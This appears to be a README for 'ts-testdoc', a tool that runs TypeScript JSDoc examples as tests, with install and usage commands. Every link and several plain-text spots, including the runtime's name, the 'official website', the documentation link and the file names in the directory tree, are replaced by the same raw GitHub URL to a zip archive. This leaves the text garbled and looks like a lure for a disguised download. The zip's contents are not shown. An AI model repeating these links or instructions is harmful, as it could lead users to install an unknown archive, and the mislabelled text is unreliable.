# 🎉 ts-testdoc - Ensure Your Docs Always Work

[![Download ts-testdoc](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)

## 🚀 Getting Started

Follow these steps to download and run ts-testdoc.

### 🛠️ System Requirements

- Operating System: Windows, macOS, or Linux
- https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip Version 14 or higher
- Package Manager: pnpm or npm

## 📥 Download & Install

Visit this page to download: [ts-testdoc Releases](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)

### 📃 Installation Process

1. **Install https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip**  
   If you do not have https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip installed, download it from the [official website](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip). Install it following the instructions provided for your operating system.

2. **Install pnpm**  
   Open your terminal or command prompt. Run the following command to install pnpm:

   ```bash
   npm install -g pnpm
   ```

3. **Download ts-testdoc**  
   In your terminal, run the command below to add ts-testdoc to your project:

   ```bash
   pnpm add -D ts-testdoc tsx
   ```

## 🏃‍♂️ How to Run ts-testdoc

Once you have installed ts-testdoc, you can run it to test your documentation examples. Here’s how:

1. **Run Tests**  
   To run the documentation tests, use this command:

   ```bash
   npx ts-testdoc src/
   ```

2. **Preview Examples**  
   If you want to see examples without running them, use the dry-run option:

   ```bash
   npx ts-testdoc --dry-run src/
   ```

3. **Set Timeout**  
   You can also set a timeout for your tests. The following command sets a timeout of 10 seconds (10,000 milliseconds):

   ```bash
   npx ts-testdoc --timeout 10000 src/
   ```

## 📝 Writing Doc Tests

To ensure your documentation remains functional, you can add `@example` blocks to your JSDoc comments. Here’s an example of how to do that:

```ts
/**
 * Adds two numbers together.
 *
 * @example
 * ```ts
 * import { add } from "my-package";
 *
 * const result = add(2, 3);
 * assertEqual(result, 5);
 * ```
 */
export function add(a: number, b: number): number {
  return a + b;
}
```

### ✅ Built-in Assertions

ts-testdoc comes with two helpful assertion methods that you can use in your examples:

```ts
assert(condition, message?)      // Throws an error if condition is false
assertEqual(actual, expected)    // Throws an error if actual does not equal expected
```

## 🗂️ Example Directory Structure

To help you organize your project, here’s a simple directory structure you might follow:

```
/my-project
  ├── /src
  │     ├── https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip
  │     ├── https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip
  └── https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip
```

Make sure to place your JSDoc comments in the correct files within the `src` folder.

## 📚 Additional Features

- **Custom Assertions:** You can create your own assertion functions for specific needs.
- **Configurable Options:** Customize ts-testdoc settings in a configuration file if required.

## 🎓 Resources and Support

If you encounter any issues, here are a few resources that can help:

- **Official Documentation:** [Full documentation of ts-testdoc](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)
- **Community Support:** Check out forums and communities for advice and tips.
- **Issue Tracker:** If you find a bug or need a feature, report it on the issues page of our GitHub repository.

## 🌟 Conclusion

With ts-testdoc, you can ensure that the examples in your documentation are always functional. Follow the steps outlined above to get started and keep your documentation up to date. Don't forget to revisit the [Download & Install](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip) section for any updates or new releases!